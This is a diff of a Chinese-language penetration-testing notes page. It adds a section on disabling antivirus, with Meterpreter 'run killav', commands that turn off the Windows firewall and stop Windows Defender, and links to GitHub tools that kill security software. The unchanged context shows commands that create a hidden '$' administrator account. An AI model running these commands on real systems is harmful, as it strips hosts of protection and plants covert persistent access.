@@ -6942,7 +6942,12 @@ ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用S
 
 <br>
 
-<h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><br>
+<h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;meterperter中使用</span><br><span class="line">run killav </span><br><span class="line">&#x2F;&#x2F;关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">&#x2F;&#x2F;关闭windowsdefender</span><br><span class="line">net stop windefend </span><br></pre></td></tr></table></figure>
+
+<p>还有几个大佬github上关杀软的项目</p>
+<p><a href="https://github.com/Yaxser/Backstab">https://github.com/Yaxser/Backstab</a></p>
+<p><a href="https://github.com/Yihsiwei/GetOut360">https://github.com/Yihsiwei/GetOut360</a></p>
+<br>
 
 <h4 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h4><h5 id="1-创建隐藏账户"><a href="#1-创建隐藏账户" class="headerlink" title="1.创建隐藏账户"></a>1.创建隐藏账户</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#创建完成后仍可以通过计算机管理和登录处看到该用户</span><br><span class="line">net user test$ Test.123 &#x2F;add</span><br><span class="line">net localgroup administrators test$ &#x2F;add</span><br></pre></td></tr></table></figure>
 
